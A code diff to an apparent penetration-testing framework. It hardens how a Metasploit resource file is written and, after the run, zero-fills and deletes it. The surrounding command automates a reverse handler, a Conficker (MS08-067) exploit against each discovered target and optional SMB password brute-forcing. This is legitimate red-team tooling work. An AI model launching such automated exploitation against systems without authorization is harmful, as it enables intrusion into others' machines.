@@ -26,6 +26,9 @@ from utils import (
 )
 
 
+MSF_RC_SHRED_CAP_BYTES = 1_000_000
+
+
 class ScanMigratedCommandSet(LazyOwnCommandSet):
     phase = "scan"
     category = "02. Scanning & Enumeration"
@@ -623,25 +626,41 @@ class ScanMigratedCommandSet(LazyOwnCommandSet):
                     config_file.write(f"set LHOST {self.params['lhost']}\n")
                     config_file.write("exploit -j -z\n")
 
-        with open(file, "w") as metarc_file:
+        flags = os.O_WRONLY | os.O_CREAT | os.O_TRUNC | os.O_NOFOLLOW
+        fd = os.open(file, flags, 0o600)
+        try:
+            with os.fdopen(fd, "w") as metarc_file:
+                try:
+                    os.chmod(file, 0o600)
+                except OSError:
+                    pass
+                tgt_list = find_tgts(self.params["rhost"])
+                setup_handler(metarc_file, self.params["lhost"], lport)
+
+                for tgt_host in tgt_list:
+                    conficker_exploit(metarc_file, tgt_host, self.params["lhost"], lport)
+                    if passwd_file:
+                        smb_brute(metarc_file, tgt_host, passwd_file, self.params["lhost"], lport)
+        finally:
             try:
                 os.chmod(file, 0o600)
             except OSError:
                 pass
-            tgt_list = find_tgts(self.params["rhost"])
-            setup_handler(metarc_file, self.params["lhost"], lport)
-
-            for tgt_host in tgt_list:
-                conficker_exploit(metarc_file, tgt_host, self.params["lhost"], lport)
-                if passwd_file:
-                    smb_brute(metarc_file, tgt_host, passwd_file, self.params["lhost"], lport)
-        try:
-            os.chmod(file, 0o600)
-        except OSError:
-            pass
         command = f"msfconsole -r {file}"
         copy2clip(command)
-        self.cmd(command)
+        try:
+            self.cmd(command)
+        finally:
+            if os.environ.get("LAZYOWN_KEEP_MSF_RC", "") != "1":
+                try:
+                    size = os.path.getsize(file)
+                    with open(file, "r+b") as shred:
+                        shred.write(b"\x00" * min(size, MSF_RC_SHRED_CAP_BYTES))
+                        shred.flush()
+                        os.fsync(shred.fileno())
+                    os.unlink(file)
+                except OSError:
+                    pass
         return
 
     @cmd2.with_category("02. Scanning & Enumeration")
